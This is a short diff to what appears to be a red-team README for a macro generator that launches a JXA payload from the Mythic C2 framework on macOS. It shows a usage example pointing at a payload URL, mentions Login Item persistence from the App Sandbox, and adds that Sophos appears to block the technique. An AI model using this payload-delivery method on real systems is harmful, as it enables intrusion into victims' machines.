@@ -23,4 +23,6 @@ _*example: python3 jxa-macro.py -u http://192.168.1.1:8000/apfell2.js*_
 
 **Note: This will launch the JXA payload inside of the App Sandbox. However, Mythic does have the ability to add Login Item persistence even from the App Sandbox.
 
+**Also Sophos appears to stop this technique from execution**
+
 
